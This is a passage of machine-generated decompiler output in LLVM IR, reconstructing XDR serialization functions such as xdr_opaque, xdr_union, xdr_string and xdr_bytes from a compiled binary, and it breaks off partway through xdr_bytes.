dec_label_pc_8063bf5:                             ; preds = %dec_label_pc_8063ba1, %dec_label_pc_8063be0, %dec_label_pc_8063bad, %dec_label_pc_8063bf3
  %v0_8063bf9 = phi i32 [ 1, %dec_label_pc_8063ba1 ], [ 1, %dec_label_pc_8063be0 ], [ %v2_8063bbe, %dec_label_pc_8063bad ], [ 0, %dec_label_pc_8063bf3 ]
  %v2_8063bf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063bf8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8063bf9

; uselistorder directives
  uselistorder i32 %v2_8063b98, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063bf5, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8063bf3, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8063bfa = call i32 @__GI_xdr_long()
  ret i32 %v0_8063bfa
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8063c00 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_8063c10 = icmp eq i32 %tmp, 0
  br i1 %v1_8063c10, label %dec_label_pc_8063c99, label %dec_label_pc_8063c14

dec_label_pc_8063c14:                             ; preds = %entry
  %v1_8063c18 = urem i32 %tmp, 4
  %v2_8063c18 = icmp eq i32 %v1_8063c18, 0
  br i1 %v2_8063c18, label %dec_label_pc_8063c23, label %dec_label_pc_8063c1d

dec_label_pc_8063c1d:                             ; preds = %dec_label_pc_8063c14
  %v2_8063c21 = sub nsw i32 4, %v1_8063c18
  br label %dec_label_pc_8063c23

dec_label_pc_8063c23:                             ; preds = %dec_label_pc_8063c14, %dec_label_pc_8063c1d
  %storemerge13 = phi i32 [ %v2_8063c21, %dec_label_pc_8063c1d ], [ 0, %dec_label_pc_8063c14 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_8063c23 = inttoptr i32 %arg2 to i32*
  %v2_8063c23 = load i32, i32* %v1_8063c23, align 4
  %v9_8063c25 = icmp eq i32 %v2_8063c23, 1
  br i1 %v9_8063c25, label %dec_label_pc_8063c33, label %dec_label_pc_8063c2a

dec_label_pc_8063c2a:                             ; preds = %dec_label_pc_8063c23
  %v5_8063c25 = icmp eq i32 %v2_8063c23, 0
  br i1 %v5_8063c25, label %dec_label_pc_8063c60, label %dec_label_pc_8063c2c

dec_label_pc_8063c2c:                             ; preds = %dec_label_pc_8063c2a
  %v9_8063c2c = icmp eq i32 %v2_8063c23, 2
  %v1_8063c2f = icmp eq i1 %v9_8063c2c, false
  br i1 %v1_8063c2f, label %dec_label_pc_8063c97, label %dec_label_pc_8063c99

dec_label_pc_8063c33:                             ; preds = %dec_label_pc_8063c23
  %v1_8063c34 = add i32 %arg2, 4
  %v2_8063c34 = inttoptr i32 %v1_8063c34 to i32*
  %v3_8063c34 = load i32, i32* %v2_8063c34, align 4
  %v5_8063c3a = add i32 %v3_8063c34, 8
  %v6_8063c3a = inttoptr i32 %v5_8063c3a to i32*
  %v7_8063c3a = load i32, i32* %v6_8063c3a, align 4
  call void @__pseudo_call(i32 %v7_8063c3a)
  %v1_8063c40 = icmp eq i32 %v3_8063c34, 0
  br i1 %v1_8063c40, label %dec_label_pc_8063c97, label %dec_label_pc_8063c44

dec_label_pc_8063c44:                             ; preds = %dec_label_pc_8063c33
  %v0_8063c44 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063c44 = icmp eq i32 %v0_8063c44, 0
  br i1 %v1_8063c44, label %dec_label_pc_8063c99, label %dec_label_pc_8063c48

dec_label_pc_8063c48:                             ; preds = %dec_label_pc_8063c44
  %v0_8063c48 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063c48 = add i32 %v0_8063c48, 4
  %v2_8063c48 = inttoptr i32 %v1_8063c48 to i32*
  %v3_8063c48 = load i32, i32* %v2_8063c48, align 4
  %v1_8063c5b = add i32 %v3_8063c48, 8
  br label %dec_label_pc_8063c8b

dec_label_pc_8063c60:                             ; preds = %dec_label_pc_8063c2a
  %v1_8063c61 = add i32 %arg2, 4
  %v2_8063c61 = inttoptr i32 %v1_8063c61 to i32*
  %v3_8063c61 = load i32, i32* %v2_8063c61, align 4
  %v5_8063c67 = add i32 %v3_8063c61, 12
  %v6_8063c67 = inttoptr i32 %v5_8063c67 to i32*
  %v7_8063c67 = load i32, i32* %v6_8063c67, align 4
  call void @__pseudo_call(i32 %v7_8063c67)
  %v1_8063c6d = icmp eq i32 %v3_8063c61, 0
  br i1 %v1_8063c6d, label %dec_label_pc_8063c97, label %dec_label_pc_8063c71

dec_label_pc_8063c71:                             ; preds = %dec_label_pc_8063c60
  %v0_8063c71 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063c71 = icmp eq i32 %v0_8063c71, 0
  br i1 %v1_8063c71, label %dec_label_pc_8063c99, label %dec_label_pc_8063c75

dec_label_pc_8063c75:                             ; preds = %dec_label_pc_8063c71
  %v0_8063c75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063c75 = add i32 %v0_8063c75, 4
  %v2_8063c75 = inttoptr i32 %v1_8063c75 to i32*
  %v3_8063c75 = load i32, i32* %v2_8063c75, align 4
  %v1_8063c88 = add i32 %v3_8063c75, 12
  br label %dec_label_pc_8063c8b

dec_label_pc_8063c8b:                             ; preds = %dec_label_pc_8063c48, %dec_label_pc_8063c75
  %stack_var_0.0 = phi i32 [ %v0_8063c48, %dec_label_pc_8063c48 ], [ %v0_8063c75, %dec_label_pc_8063c75 ]
  %storemerge1.in.in = phi i32 [ %v1_8063c5b, %dec_label_pc_8063c48 ], [ %v1_8063c88, %dec_label_pc_8063c75 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_807d25c.807 to i32), %dec_label_pc_8063c48 ], [ ptrtoint (i32* @global_var_806e25d.808 to i32), %dec_label_pc_8063c75 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_8063c8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063c8c, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063c00, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_8063c99

dec_label_pc_8063c97:                             ; preds = %dec_label_pc_8063c60, %dec_label_pc_8063c33, %dec_label_pc_8063c2c
  br label %dec_label_pc_8063c99

dec_label_pc_8063c99:                             ; preds = %dec_label_pc_8063c8b, %entry, %dec_label_pc_8063c44, %dec_label_pc_8063c71, %dec_label_pc_8063c2c, %dec_label_pc_8063c97
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_8063c97 ], [ %arg1, %dec_label_pc_8063c44 ], [ %stack_var_0.0, %dec_label_pc_8063c8b ], [ %arg1, %dec_label_pc_8063c71 ], [ %arg1, %dec_label_pc_8063c2c ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_8063c97 ], [ %arg2, %dec_label_pc_8063c44 ], [ %stack_var_4.0, %dec_label_pc_8063c8b ], [ %arg2, %dec_label_pc_8063c71 ], [ %arg2, %dec_label_pc_8063c2c ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_8063c97 ], [ 1, %dec_label_pc_8063c44 ], [ 1, %dec_label_pc_8063c8b ], [ 1, %dec_label_pc_8063c71 ], [ 1, %dec_label_pc_8063c2c ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8063c23, { 0, 2, 1 }
  uselistorder i32 %v1_8063c18, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_8063c99, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8063c8b, { 1, 0 }
  uselistorder label %dec_label_pc_8063c23, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8063c9d = load i32, i32* @ebp, align 4
  %v0_8063c9e = load i32, i32* @edi, align 4
  %v0_8063ca0 = load i32, i32* @ebx, align 4
  store i32 %v0_8063ca0, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* %edi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_8063cbe = call i32 @xdr_enum(i32 %arg1, i32 %tmp10)
  %v1_8063cc6 = icmp eq i32 %v2_8063cbe, 0
  br i1 %v1_8063cc6, label %dec_label_pc_8063d15, label %dec_label_pc_8063cca

dec_label_pc_8063cca:                             ; preds = %entry
  %v0_8063cca = load i32, i32* %edi.global-to-local, align 4
  %v1_8063cca = inttoptr i32 %v0_8063cca to i32*
  %v2_8063cca = load i32, i32* %v1_8063cca, align 4
  %v0_8063ceb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063ceb23 = add i32 %v0_8063ceb.pre, 4
  %v2_8063ceb24 = inttoptr i32 %v1_8063ceb23 to i32*
  %v3_8063ceb25 = load i32, i32* %v2_8063ceb24, align 4
  store i32 %v3_8063ceb25, i32* @ecx, align 4
  %v1_8063cee26 = icmp eq i32 %v3_8063ceb25, 0
  %v1_8063cf027 = icmp eq i1 %v1_8063cee26, false
  br i1 %v1_8063cf027, label %dec_label_pc_8063cce, label %dec_label_pc_8063cf2

dec_label_pc_8063cce:                             ; preds = %dec_label_pc_8063cca, %dec_label_pc_8063ce8
  %v3_8063ceb29 = phi i32 [ %v3_8063ceb, %dec_label_pc_8063ce8 ], [ %v3_8063ceb25, %dec_label_pc_8063cca ]
  %v0_8063ce828 = phi i32 [ %v1_8063ce8, %dec_label_pc_8063ce8 ], [ %v0_8063ceb.pre, %dec_label_pc_8063cca ]
  %v1_8063cce = inttoptr i32 %v0_8063ce828 to i32*
  %v2_8063cce = load i32, i32* %v1_8063cce, align 4
  %v14_8063cce = icmp eq i32 %v2_8063cce, %v2_8063cca
  %v1_8063cd0 = icmp eq i1 %v14_8063cce, false
  br i1 %v1_8063cd0, label %dec_label_pc_8063ce8, label %dec_label_pc_8063cd2

dec_label_pc_8063cd2:                             ; preds = %dec_label_pc_8063cce
  br label %dec_label_pc_8063d0c

dec_label_pc_8063ce8:                             ; preds = %dec_label_pc_8063cce
  %v1_8063ce8 = add i32 %v0_8063ce828, 8
  store i32 %v1_8063ce8, i32* %ebx.global-to-local, align 4
  %v1_8063ceb = add i32 %v0_8063ce828, 12
  %v2_8063ceb = inttoptr i32 %v1_8063ceb to i32*
  %v3_8063ceb = load i32, i32* %v2_8063ceb, align 4
  store i32 %v3_8063ceb, i32* @ecx, align 4
  %v1_8063cee = icmp eq i32 %v3_8063ceb, 0
  %v1_8063cf0 = icmp eq i1 %v1_8063cee, false
  br i1 %v1_8063cf0, label %dec_label_pc_8063cce, label %dec_label_pc_8063cf2

dec_label_pc_8063cf2:                             ; preds = %dec_label_pc_8063ce8, %dec_label_pc_8063cca
  %v1_8063cf2 = icmp eq i32 %arg5, 0
  br i1 %v1_8063cf2, label %dec_label_pc_8063d15, label %dec_label_pc_8063cf6

dec_label_pc_8063cf6:                             ; preds = %dec_label_pc_8063cf2
  store i32 %arg5, i32* @ecx, align 4
  br label %dec_label_pc_8063d0c

dec_label_pc_8063d0c:                             ; preds = %dec_label_pc_8063cd2, %dec_label_pc_8063cf6
  %v0_8063d13 = phi i32 [ %v3_8063ceb29, %dec_label_pc_8063cd2 ], [ %arg5, %dec_label_pc_8063cf6 ]
  %v2_8063d0f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063d0f, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063c9e, i32* %edi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8063d13)
  br label %dec_label_pc_8063d15

dec_label_pc_8063d15:                             ; preds = %dec_label_pc_8063cf2, %entry, %dec_label_pc_8063d0c
  %v2_8063d1a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063d1a, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063c9e, i32* @edi, align 4
  store i32 %v0_8063c9d, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_8063ceb, { 1, 2, 0 }
  uselistorder i32 %v1_8063ce8, { 1, 0 }
  uselistorder i32 %v0_8063ce828, { 0, 2, 1 }
  uselistorder i32 %v0_8063c9e, { 1, 0 }
  uselistorder void (i32)* @__pseudo_branch, { 3, 5, 6, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32)* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder i32 %arg5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063d15, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8063cce, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp16 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8063d1f = load i32, i32* @edi, align 4
  %v0_8063d20 = load i32, i32* @esi, align 4
  %v0_8063d21 = load i32, i32* @ebx, align 4
  store i32 %tmp16, i32* @esi, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8063d2d = load i32, i32* %arg1, align 4
  store i32 %v2_8063d2d, i32* %eax.global-to-local, align 4
  %v1_8063d2f = inttoptr i32 %arg2 to i32*
  %v2_8063d2f = load i32, i32* %v1_8063d2f, align 4
  %v1_8063d31 = icmp eq i32 %v2_8063d2d, 0
  br i1 %v1_8063d31, label %dec_label_pc_8063d43, label %dec_label_pc_8063d35

dec_label_pc_8063d35:                             ; preds = %entry
  %v9_8063d35 = icmp eq i32 %v2_8063d2d, 2
  %v1_8063d38 = icmp eq i1 %v9_8063d35, false
  br i1 %v1_8063d38, label %dec_label_pc_8063d35.dec_label_pc_8063d5b_crit_edge, label %dec_label_pc_8063d3a

dec_label_pc_8063d35.dec_label_pc_8063d5b_crit_edge: ; preds = %dec_label_pc_8063d35
  br label %dec_label_pc_8063d5b

dec_label_pc_8063d3a:                             ; preds = %dec_label_pc_8063d35
  %v1_8063d3a = icmp eq i32 %v2_8063d2f, 0
  %v1_8063d3c = icmp eq i1 %v1_8063d3a, false
  br i1 %v1_8063d3c, label %dec_label_pc_8063d4b, label %dec_label_pc_8063ded

dec_label_pc_8063d43:                             ; preds = %entry
  %v1_8063d43 = icmp eq i32 %v2_8063d2f, 0
  br i1 %v1_8063d43, label %dec_label_pc_8063df4, label %dec_label_pc_8063d4b

dec_label_pc_8063d4b:                             ; preds = %dec_label_pc_8063d43, %dec_label_pc_8063d3a
  %v5_8063d4e = inttoptr i32 %v2_8063d2f to i8*
  %v3_8063d4f = call i32 @strlen(i8* %v5_8063d4e)
  store i32 %v3_8063d4f, i32* %eax.global-to-local, align 4
  store i32 %v3_8063d4f, i32* %stack_var_-16, align 4
  %v0_8063d62.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8063d5b

dec_label_pc_8063d5b:                             ; preds = %dec_label_pc_8063d35.dec_label_pc_8063d5b_crit_edge, %dec_label_pc_8063d4b
  %v0_8063d62 = phi i32 [ %tmp16, %dec_label_pc_8063d35.dec_label_pc_8063d5b_crit_edge ], [ %v0_8063d62.pre, %dec_label_pc_8063d4b ]
  %v2_8063d5d = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8063d5d, i32* @eax, align 4
  %tmp27 = inttoptr i32 %v0_8063d62 to i32*
  %v6_8063d63 = call i32 @xdr_u_long(i32* %tmp27, i32 %v2_8063d5d)
  store i32 %v6_8063d63, i32* %eax.global-to-local, align 4
  %v1_8063d6b = icmp eq i32 %v6_8063d63, 0
  br i1 %v1_8063d6b, label %dec_label_pc_8063df4, label %dec_label_pc_8063d73

dec_label_pc_8063d73:                             ; preds = %dec_label_pc_8063d5b
  %v3_8063d73 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_8063d73, i32* %eax.global-to-local, align 4
  %v6_8063d7b = icmp ugt i32 %v3_8063d73, %arg3
  br i1 %v6_8063d7b, label %dec_label_pc_8063df4, label %dec_label_pc_8063d7d

dec_label_pc_8063d7d:                             ; preds = %dec_label_pc_8063d73
  %v0_8063d7d = load i32, i32* @esi, align 4
  %v1_8063d7d = inttoptr i32 %v0_8063d7d to i32*
  %v2_8063d7d = load i32, i32* %v1_8063d7d, align 4
  %v9_8063d7f = icmp eq i32 %v2_8063d7d, 1
  br i1 %v9_8063d7f, label %dec_label_pc_8063d8d, label %dec_label_pc_8063d84

dec_label_pc_8063d84:                             ; preds = %dec_label_pc_8063d7d
  %v5_8063d7f = icmp eq i32 %v2_8063d7d, 0
  br i1 %v5_8063d7f, label %dec_label_pc_8063dc6, label %dec_label_pc_8063d86

dec_label_pc_8063d86:                             ; preds = %dec_label_pc_8063d84
  %v9_8063d86 = icmp eq i32 %v2_8063d7d, 2
  %v1_8063d89 = icmp eq i1 %v9_8063d86, false
  br i1 %v1_8063d89, label %dec_label_pc_8063df4, label %dec_label_pc_8063dd7

dec_label_pc_8063d8d:                             ; preds = %dec_label_pc_8063d7d
  %v1_8063d8d = add i32 %v3_8063d73, 1
  %v8_8063d8d = icmp eq i32 %v1_8063d8d, 0
  store i32 %v1_8063d8d, i32* %eax.global-to-local, align 4
  br i1 %v8_8063d8d, label %dec_label_pc_8063ded, label %dec_label_pc_8063d90

dec_label_pc_8063d90:                             ; preds = %dec_label_pc_8063d8d
  %v0_8063d90 = load i32, i32* @ebx, align 4
  %v1_8063d90 = icmp eq i32 %v0_8063d90, 0
  %v1_8063d92 = icmp eq i1 %v1_8063d90, false
  br i1 %v1_8063d92, label %dec_label_pc_8063dbe, label %dec_label_pc_8063d94

dec_label_pc_8063d94:                             ; preds = %dec_label_pc_8063d90
  %v2_8063d98 = call i32 @malloc(i32 %v1_8063d8d)
  store i32 %v2_8063d98, i32* %eax.global-to-local, align 4
  store i32 %v2_8063d98, i32* @ebx, align 4
  %v1_8063da2 = load i32, i32* @edi, align 4
  %v2_8063da2 = inttoptr i32 %v1_8063da2 to i32*
  store i32 %v2_8063d98, i32* %v2_8063da2, align 4
  %v1_8063da4 = icmp eq i32 %v2_8063d98, 0
  %v1_8063da6 = icmp eq i1 %v1_8063da4, false
  br i1 %v1_8063da6, label %dec_label_pc_8063d94.dec_label_pc_8063dbe_crit_edge, label %dec_label_pc_8063da8

dec_label_pc_8063d94.dec_label_pc_8063dbe_crit_edge: ; preds = %dec_label_pc_8063d94
  %v3_8063dbe.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8063dc2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8063dbe

dec_label_pc_8063da8:                             ; preds = %dec_label_pc_8063d94
  %v0_8063daa = load i32, i32* @global_var_8074610, align 16
  %v3_8063db5 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_806e228.809 to i32), i32 %v0_8063daa)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063dd2

dec_label_pc_8063dbe:                             ; preds = %dec_label_pc_8063d94.dec_label_pc_8063dbe_crit_edge, %dec_label_pc_8063d90
  %v0_8063dc2 = phi i32 [ %v0_8063dc2.pre, %dec_label_pc_8063d94.dec_label_pc_8063dbe_crit_edge ], [ %v0_8063d90, %dec_label_pc_8063d90 ]
  %v3_8063dbe = phi i32 [ %v3_8063dbe.pre, %dec_label_pc_8063d94.dec_label_pc_8063dbe_crit_edge ], [ %v3_8063d73, %dec_label_pc_8063d90 ]
  store i32 %v3_8063dbe, i32* %eax.global-to-local, align 4
  %v2_8063dc2 = add i32 %v3_8063dbe, %v0_8063dc2
  %v3_8063dc2 = inttoptr i32 %v2_8063dc2 to i8*
  store i8 0, i8* %v3_8063dc2, align 1
  %v3_8063dc7.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8063dcc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8063dc6

dec_label_pc_8063dc6:                             ; preds = %dec_label_pc_8063d84, %dec_label_pc_8063dbe
  %v0_8063dcc = phi i32 [ %v0_8063d7d, %dec_label_pc_8063d84 ], [ %v0_8063dcc.pre, %dec_label_pc_8063dbe ]
  %v3_8063dc7 = phi i32 [ %v3_8063d73, %dec_label_pc_8063d84 ], [ %v3_8063dc7.pre, %dec_label_pc_8063dbe ]
  %v0_8063dcb = load i32, i32* @ebx, align 4
  %v5_8063dcd = call i32 @xdr_opaque(i32 %v0_8063dcc, i32 %v0_8063dcb, i32 %v3_8063dc7)
  store i32 %v5_8063dcd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063dd2

dec_label_pc_8063dd2:                             ; preds = %dec_label_pc_8063dd7, %dec_label_pc_8063da8, %dec_label_pc_8063dc6
  %v0_8063dfc.pre = phi i32 [ %v0_8063dfc.pre.pre, %dec_label_pc_8063dd7 ], [ 0, %dec_label_pc_8063da8 ], [ %v5_8063dcd, %dec_label_pc_8063dc6 ]
  br label %dec_label_pc_8063df6

dec_label_pc_8063dd7:                             ; preds = %dec_label_pc_8063d86
  %v0_8063dda = load i32, i32* @ebx, align 4
  %v2_8063ddb = call i32 @free(i32 %v0_8063dda)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8063de5 = load i32, i32* @edi, align 4
  %v1_8063de5 = inttoptr i32 %v0_8063de5 to i32*
  store i32 0, i32* %v1_8063de5, align 4
  %v0_8063dfc.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063dd2

dec_label_pc_8063ded:                             ; preds = %dec_label_pc_8063d3a, %dec_label_pc_8063d8d
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063df6

dec_label_pc_8063df4:                             ; preds = %dec_label_pc_8063d86, %dec_label_pc_8063d73, %dec_label_pc_8063d5b, %dec_label_pc_8063d43
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063df6

dec_label_pc_8063df6:                             ; preds = %dec_label_pc_8063ded, %dec_label_pc_8063dd2, %dec_label_pc_8063df4
  %v0_8063dfc = phi i32 [ 1, %dec_label_pc_8063ded ], [ %v0_8063dfc.pre, %dec_label_pc_8063dd2 ], [ 0, %dec_label_pc_8063df4 ]
  store i32 %v0_8063d21, i32* @ebx, align 4
  store i32 %v0_8063d20, i32* @esi, align 4
  store i32 %v0_8063d1f, i32* @edi, align 4
  ret i32 %v0_8063dfc

; uselistorder directives
  uselistorder i32 %v2_8063d98, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8063d7d, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8063df6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063ded, { 1, 0 }
  uselistorder label %dec_label_pc_8063dd2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063dc6, { 1, 0 }
  uselistorder label %dec_label_pc_8063d5b, { 1, 0 }
}

define i32 @xdr_wrapstring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8063e0a = inttoptr i32 %arg1 to i32*
  %v4_8063e0a = call i32 @__GI_xdr_string(i32* %v3_8063e0a, i32 %arg2, i32 -1)
  %v1_8063e0f = icmp eq i32 %v4_8063e0a, 0
  %v1_8063e11 = icmp eq i1 %v1_8063e0f, false
  %v2_8063e11 = zext i1 %v1_8063e11 to i32
  ret i32 %v2_8063e11
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8063e1b = load i32, i32* @ebp, align 4
  %v0_8063e1c = load i32, i32* @edi, align 4
  %v0_8063e1d = load i32, i32* @esi, align 4
  %v0_8063e1e = load i32, i32* @ebx, align 4
  store i32 %v0_8063e1e, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %tmp9, i32* @edi, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v6_8063e3b = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  %v1_8063e43 = icmp eq i32 %v6_8063e3b, 0
  br i1 %v1_8063e43, label %dec_label_pc_8063ed1, label %dec_label_pc_8063e4b

dec_label_pc_8063e4b:                             ; preds = %entry
  %v0_8063e4b = load i32, i32* %esi.global-to-local, align 4
  %v1_8063e4b = inttoptr i32 %v0_8063e4b to i32*
  %v2_8063e4b = load i32, i32* %v1_8063e4b, align 4
  store i32 %v2_8063e4b, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_8063e4b, %arg4
  %v0_8063e58.pre = load i32, i32* @edi, align 4
  %v1_8063e58.phi.trans.insert = inttoptr i32 %v0_8063e58.pre to i32*
  %v2_8063e58.pre = load i32, i32* %v1_8063e58.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_8063e53, label %dec_label_pc_8063e58

dec_label_pc_8063e53:                             ; preds = %dec_label_pc_8063e4b
  %v11_8063e53 = icmp eq i32 %v2_8063e58.pre, 2
  %v1_8063e56 = icmp eq i1 %v11_8063e53, false
  br i1 %v1_8063e56, label %dec_label_pc_8063ed1, label %dec_label_pc_8063e58

dec_label_pc_8063e58:                             ; preds = %dec_label_pc_8063e4b, %dec_label_pc_8063e53
  %v9_8063e5a = icmp eq i32 %v2_8063e58.pre, 1
  br i1 %v9_8063e5a, label %dec_label_pc_8063e68, label %dec_label_pc_8063e5f

dec_label_pc_8063e5f:                             ; preds = %dec_label_pc_8063e58
  %v5_8063e5a = icmp eq i32 %v2_8063e58.pre, 0
  br i1 %v5_8063e5a, label %dec_label_pc_8063e9b, label %dec_label_pc_8063e61

dec_label_pc_8063e61:                             ; preds = %dec_label_pc_8063e5f
  %v9_8063e61 = icmp eq i32 %v2_8063e58.pre, 2
  %v1_8063e64 = icmp eq i1 %v9_8063e61, false
  br i1 %v1_8063e64, label %dec_label_pc_8063ed1, label %dec_label_pc_8063eb3

dec_label_pc_8063e68:                             ; preds = %dec_label_pc_8063e58
  %v1_8063e68 = icmp eq i32 %v2_8063e4b, 0
  br i1 %v1_8063e68, label %dec_label_pc_8063ed5, label %dec_label_pc_8063e6c

dec_label_pc_8063e6c:                             ; preds = %dec_label_pc_8063e68
  %v0_8063e6c = load i32, i32* @ebx, align 4
  %v1_8063e6c = icmp eq i32 %v0_8063e6c, 0
  %v1_8063e6e = icmp eq i1 %v1_8063e6c, false
  br i1 %v1_8063e6e, label %dec_label_pc_8063e9b, label %dec_label_pc_8063e70

dec_label_pc_8063e70:                             ; preds = %dec_label_pc_8063e6c
  %v2_8063e74 = call i32 @malloc(i32 %v2_8063e4b)
  store i32 %v2_8063e74, i32* @ebx, align 4
  %v1_8063e7e = load i32, i32* @ebp, align 4
  %v2_8063e7e = inttoptr i32 %v1_8063e7e to i32*
  store i32 %v2_8063e74, i32* %v2_8063e7e, align 4
  %v1_8063e81 = icmp eq i32 %v2_8063e74, 0
  %v1_8063e83 = icmp eq i1 %v1_8063e81, false
  br i1 %v1_8063e83, label %dec_label_pc_8063e70.dec_label_pc_8063e9b_crit_edge, label %dec_label_pc_8063e85

dec_label_pc_8063e70.dec_label_pc_8063e9b_crit_edge: ; preds = %dec_label_pc_8063e70
  %v0_8063ea3.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8063e9b

dec_label_pc_8063e85:                             ; preds = %dec_label_pc_8063e70
  %v0_8063e87 = load i32, i32* @global_var_8074610, align 16
  %v3_8063e92 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806e243.810 to i32), i32 %v0_8063e87)
  br label %dec_label_pc_8063ecc

dec_label_pc_8063e9b:                             ; preds = %dec_label_pc_8063e70.dec_label_pc_8063e9b_crit_edge, %dec_label_pc_8063e6c, %dec_label_pc_8063e5f
  %v0_8063ea3 = phi i32 [ %v0_8063ea3.pre, %dec_label_pc_8063e70.dec_label_pc_8063e9b_crit_edge ], [ %v0_8063e58.pre, %dec_label_pc_8063e6c ], [ %v0_8063e58.pre, %dec_label_pc_8063e5f ]
  %v0_8063e9f = load i32, i32* @ebx, align 4
  %v2_8063eaa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063eaa, i32* @ebx, align 4
  store i32 %v0_8063e1d, i32* @esi, align 4
  store i32 %v0_8063e1c, i32* @edi, align 4
  store i32 %v0_8063e1b, i32* @ebp, align 4
  %v3_8063eae = call i32 @xdr_opaque(i32 %v0_8063ea3, i32 %v0_8063e9f, i32 %v2_8063e4b)
  br label %dec_label_pc_8063eb3

dec_label_pc_8063eb3:                             ; preds = %dec_label_pc_8063e61, %dec_label_pc_8063e9b
  %v0_8063eb3 = load i32, i32* @ebx, align 4
